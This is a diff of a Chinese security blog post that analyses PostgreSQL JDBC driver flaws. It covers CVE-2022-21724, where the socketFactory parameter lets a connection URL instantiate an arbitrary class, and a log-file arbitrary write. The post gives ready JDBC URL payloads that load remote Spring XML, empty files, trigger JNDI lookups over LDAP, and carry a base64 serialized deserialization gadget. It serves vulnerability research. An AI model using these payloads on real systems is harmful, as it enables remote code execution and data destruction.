@@ -9,7 +9,7 @@
     
     <title>
         
-            postgreSQL |
+            PostgreSql利用分析 |
         
         1diot9&#39;s Blog
     </title>
@@ -238,7 +238,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        postgreSQL
+                        PostgreSql利用分析
                     </div>
                 
 
@@ -272,7 +272,7 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon May 05 2025 20:09:55 GMT+0800">2025-05-05 20:09:55</span>
+                    <span class="datetime" data-updated="Wed Oct 22 2025 18:45:50 GMT+0800">2025-10-22 18:45:50</span>
                 </span>
             
         
@@ -302,12 +302,12 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>108 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.4k 字</span>
             </span>
         
         
             <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>5 分钟</span>
             </span>
         
         
@@ -329,10 +329,110 @@
                     
 
                     
-                         <h1 id="构造方法调用"><a href="#构造方法调用" class="headerlink" title="构造方法调用"></a>构造方法调用</h1><p>DriverManager.getConnection(“jdbc:postgresql:&#x2F;&#x2F;node1&#x2F;test?socketFactory&#x3D;org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg&#x3D;<a class="link"   target="_blank" rel="noopener" href="http://target/exp.xml" >http://target/exp.xml<i class="fas fa-external-link-alt"></i></a>“);</p>
-<h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cve202221724</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerLevel</span> <span class="operator">=</span> <span class="string">&quot;debug&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerFile</span> <span class="operator">=</span> <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">        String shellContent=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=&quot;</span>+loggerLevel+<span class="string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+ <span class="string">&quot;&amp;&quot;</span>+shellContent;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(jdbcUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>PostgreSql主要有两个漏洞，一个是调用任意String或Properties的构造方法，常与ClassPathXml结合；另一个是修改日志路径实现写文件的漏洞，不过文件前后会有脏字符。</p>
+<p>这里简单分析一下两个漏洞并给出利用方法。</p>
+<h1 id="CVE-2022-21724"><a href="#CVE-2022-21724" class="headerlink" title="CVE-2022-21724"></a>CVE-2022-21724</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>x&lt; 42.2.25</p>
+<p>42.3.0&lt;&#x3D;x&lt; 42.3.2</p>
+<p>本文选择42.3.0进行分析</p>
+<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758768675545-97b72b52-c1f5-470f-a7de-d45ca13c94ac.png"  alt="img"></p>
+<p>jdbc连接最终会走到org.postgresql.util.ObjectFactory#instantiate</p>
+<p>Class.forName会加载静态代码。之后会先尝试获取单Properties参数的构造方法，没有的话，再尝试获取单String参数的构造方法。最后进行newInstance，调用相应的构造方法。</p>
+<p>单String构造方法中，最典型的应该就是ClassPathXmlApplicationContext了。</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>从org.postgresql.Driver#connect开始：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758770349287-b6e02422-250a-4245-98a5-d00a464091b3.png"  alt="img"></p>
+<p>首先是要求url以jdbc:postgresql: 开头</p>
+<p>后面对url进行解析，一段一段看。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758770574250-0a4f6fa5-d516-4383-9d60-692b127d1a63.png"  alt="img"></p>
+<p>先由 ? 划分urlServer和urlArgs。会再检查一遍是否以jdbc:postgresql: 开头。然后判断后面的部分是不是以&#x2F;&#x2F; 开头。然后判断urlServer部分，是不是以 &#x2F; 结尾。是的话，会开始解析host，port，dbname。其中host:port可以有多组，每组以逗号分开。同时，由下面的代码能看出：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758770758548-97b644bf-0c85-4bd4-965f-7951eeb2ffd0.png"  alt="img"></p>
+<p>如果不以 &#x2F;&#x2F; 开头，则会添加默认的数据源，即localhost:5432：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758770943711-eae87a3b-c46c-4a7f-aa5b-732afa8b2130.png"  alt="img"></p>
+<p>接下来开始解析参数部分，会对参数进行一次urldecode：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758771149321-19fbcb83-cfbc-411e-a63f-7e7d28617565.png"  alt="img"></p>
+<p>综上，可以发现，? 前面的部分可以随便写，只要以 &#x2F; 结尾就行了。</p>
+<p>回到connect：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758772934120-798f88d7-d58b-4920-acb6-f3f868446cc0.png"  alt="img"></p>
+<p>这里的setupLog和后面的任意文件写入有关，后面会单独讲。</p>
+<p>之后跟进makeConnection，跟进PgConnection构造方法，再跟进openConnection：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758773129004-63fe3ea1-2455-4185-84f6-1552a5ff8aef.png"  alt="img"></p>
+<p>这里会取出参数中的protocolVersion，一般可以不写，要写的话，就只能写3</p>
+<p>跟进openConnectionImpl：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758773311704-387edf20-1fe4-4c57-8663-2b4e86987d23.png"  alt="img"></p>
+<p>这里跟进后，就会触发漏洞代码：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758773347287-4befc53f-4ba8-49bd-95e9-48445f1a2439.png"  alt="img"></p>
+<p>如果不写socketFactory参数，就会设置为默认的工厂，进入下面的逻辑：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758773824219-d542fff0-84c9-459a-b90c-14e3d2b8f995.png"  alt="img"></p>
+<p>大概就是遍历每一个serverUrl，分别调用tryConnect：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758773981216-96190eab-464d-4936-b94b-761b75665d55.png"  alt="img"></p>
+<p>在enableSSL方法中，根据目标的返回来进入不同的case，只有返回S的ascii码时，才能正常进入下一步：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758774091660-e85d4e7a-781a-4583-acfd-cf633733f054.png"  alt="img"></p>
+<p>convert方法中，也出现了getSocketFactory方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758774133106-aee92dfc-3bd0-47dd-b139-319990792769.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758774151934-b5bb1ea3-8b8a-4984-80c3-578ca615dc80.png"  alt="img"></p>
+<p>同样是可以进入漏洞代码，只是args的名字需要换一下。</p>
+<p>除此之外，还有其他地方能够触发，同样是convert方法，跟进下面的verifyPeerName：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758774628216-1dc0e250-65a0-4127-b9fc-f806578f0f73.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758774639274-6efe92e8-1324-4039-b229-9d1f4f5b77e9.png"  alt="img"></p>
+<p>不过这里就只能调用Properties的构造方法了。</p>
+<p>参考文章里还写了别的利用方式，可以自行阅读。</p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>su18师傅已经写的很好了，建议直接看他的，这里就搬运一下。</p>
+<p>[1] ClassPathXmlApplicationContext</p>
+<p>历史上最经典的利用，ClassPathXmlApplicationContext&#x2F;FileSystemXmlApplicationContext 通过远程执行 xml 出网来 RCE。需要依赖 spring-context-support。（或者其他自行封装包例如 weblogic 的 <code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code> 等）</p>
+<p>此种利用方式首先出现在 Jackson 的利用链 CVE-2017-17485 中，后作为单 String 构造方法被广泛利用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://127.0.0.1:8000/poc.xml</span><br></pre></td></tr></table></figure>
 
-<p>不过这样写保存的文件前后会有脏字符。</p>
+<p>关于 ClassPathXmlApplicationContext 的更多利用细节将在后面进行描述。</p>
+<p>[2] FileOutputStream&#x2F;InputStream</p>
+<p>FileOutputStream 清空文件，实战中可以配合业务逻辑清空特定文件，达到 RCE 的目的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=java.io.FileOutputStream&amp;socketFactoryArg=/var/www/app/install.lck</span><br></pre></td></tr></table></figure>
+
+<p>反过来 FileInputStream 可以探测文件是否存在，不过需要看到报错信息来判断。</p>
+<p>[3] JLabel</p>
+<p>CS RCE 的套娃，需要依赖 batik-swing（对 JDK 环境及版本也有要求）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=javax.swing.JLabel&amp;socketFactoryArg=&lt;html&gt;&lt;object classid=&quot;org.apache.batik.swing.JSVGCanvas&quot;&gt;&lt;param name=&quot;URI&quot; value=&quot;http://localhost:8080/1.xml&quot;&gt;&lt;/object&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>[4] MiniAdmin</p>
+<p>Mysql 的套娃。需要依赖 mysql-connector-java（这个类高版本才有）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=com.mysql.cj.jdbc.admin.MiniAdmin&amp;socketFactoryArg=jdbc:mysql://127.0.0.1:3306/test?...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>[5] IniEnvironment</p>
+<p>在 ActiveMQ 不出网利用中出现的类，可以配合 BCEL 加载以及反序列化，需要依赖 activemq-shiro 以及对应依赖。</p>
+<p>根据 Anchor 师傅在先知上发现的文章。有两条不出网的利用链，第一条是 BasicDataSource 配合 BCEL 类加载，需要的依赖和限制有点多，这里就不列举了。</p>
+<p>第二条是 <code>ActiveMQObjectMessage#getObject</code> 触发的反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=org.apache.activemq.shiro.env.IniEnvironment&amp;socketFactoryArg=%5Bmain%5D%0Abs%20%3D%20org.apache.activemq.util.ByteSequence%0Amessage%20%3D%20org.apache.activemq.command.ActiveMQObjectMessage%0Abs.data%20%3D%20rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA%2Fb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y%2B%2FSZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB%2BAARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAAAAAAAdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX%2BAYIVOACAAB4cAAAAU3K%2Frq%2BAAAAMQAWAQA0b3JnL2FwYWNoZS93aWNrZXQvYmF0aWsvYnJpZGdlL1NWR0Jyb2tlbkxpbmtQcm92aWRlcgcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlDAAFAAYKAAQACAEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQAIQACAAQAAAAAAAEAAQAFAAYAAQAHAAAAGgACAAEAAAAOKrcACbgADxIRtgAVV7EAAAAAAAB1cQB%2BABAAAAEayv66vgAAADQAEQEANW9yZy9hcGFjaGUvY29tbW9ucy9qYW0vcHJvdmlkZXIvSmFtU2VydmljZUZhY3RvcnlJbXBsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABpKYW1TZXJ2aWNlRmFjdG9yeUltcGwuamF2YQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQEABjxpbml0PgEAAygpVgwADAANCgAEAA4BAARDb2RlACEAAgAEAAAAAQAaAAcACAABAAsAAAACAAkAAQABAAwADQABABAAAAARAAEAAQAAAAUqtwAPsQAAAAAAAQAFAAAAAgAGcHQAAWFwdwEAeHEAfgANeA%3D%3D%0Abs.length%20%3D%201628%0Abs.offset%20%3D%200%0Amessage.content%20%3D%20%24bs%0Amessage.trustAllPackages%20%3D%20true%0Amessage.object.x%20%3D%20x</span><br></pre></td></tr></table></figure>
+
+
+
+<p>[6] HikariConfig</p>
+<p>柯字辈师傅分享，利用 Properties 方式，走 HikariConfig 触发 JNDI，需要依赖 HikariCP。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=com.zaxxer.hikari.HikariConfi&amp;metricRegistry=ldap://127.0.0.1:1389/exp</span><br></pre></td></tr></table></figure>
+
+
+
+<p>[其他] 开发代码</p>
+<p>除了上面常见依赖的代码，在一些产品中可能存在能够利用的方式。</p>
+<p>例如在 VMWare Workspace ONE Access RCE 中使用 <code>com.vmware.licensecheck.LicenseChecker</code> 二次反序列化来达到不出网利用。</p>
+<p>参考项目：<a class="link"   target="_blank" rel="noopener" href="https://github.com/sourceincite/hekate" >https://github.com/sourceincite/hekate<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>工厂类实例化时，加上了对预期类的判断。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758774876697-df7bb91a-0cad-4d94-b662-96bd44d31c2d.png"  alt="img"></p>
+<h1 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h1><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>&lt;42.3.3</p>
+<h2 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p>org.postgresql.Driver#setupLoggerFromProperties中，会跟进URL中的参数进行日志设置，从而指定PARENT_LOGGER的日志等级和日志文件名称。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758776727132-3fa18ac9-5842-401b-80f1-9597cc5ebd8a.png"  alt="img"></p>
+<p>这里的FileHandler的写入路径可以自己指定。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758776756554-0f5b4656-87a6-4741-a813-cad711de94f4.png"  alt="img"></p>
+<p>最后会向PARENT_LOGGER中添加新的handler。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758776813877-f58e33d9-458a-42a9-9dea-8bacaca31e64.png"  alt="img"></p>
+<p>紧接着就会对完整url进行日志记录，调用栈如下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758776872587-84ab727b-20bb-4cd9-99fc-1859934f8244.png"  alt="img"></p>
+<p>最终会获取到刚刚写入的parentlogger</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1758776996806-494c4cca-c41a-4166-bfca-332f501075b7.png"  alt="img"></p>
+<p>不过，这样写入的文件前后会有脏字符，如下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761129189205-5e698d48-bb5c-41ec-82df-0c6dd4a16acc.png"  alt="img"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://su18.org/post/postgresql-jdbc-attack-and-stuff/" >Postgresql JDBC Attack and Stuff | 素十八<i class="fas fa-external-link-alt"></i></a></p>
 
                     
                 </div>
@@ -343,7 +443,7 @@
     <div class="copyright-info-content border-box">
         <div class="copyright-info-top border-box">
             <div class="copyright-post-title border-box text-ellipsis">
-                postgreSQL
+                PostgreSql利用分析
             </div>
 
             <div class="copyright-post-link border-box text-ellipsis">
@@ -467,7 +567,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">构造方法调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">写文件</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2022-21724"><span class="nav-number">2.</span> <span class="nav-text">CVE-2022-21724</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">2.3.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">2.4.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">2.5.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">任意文件写入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="nav-number">3.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81-1"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol>
     </div>
 </div>
 
@@ -509,7 +609,7 @@
             
                 <span class="count-item border-box word">
                     <span class="item-type border-box">总字数</span>
-                    <span class="item-value border-box word">74.9k</span>
+                    <span class="item-value border-box word">76.2k</span>
                 </span>
             
 
@@ -657,7 +757,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">构造方法调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">写文件</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2022-21724"><span class="nav-number">2.</span> <span class="nav-text">CVE-2022-21724</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">2.3.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">2.4.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">2.5.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">任意文件写入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="nav-number">3.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81-1"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol>
     </div>
 </div>
 
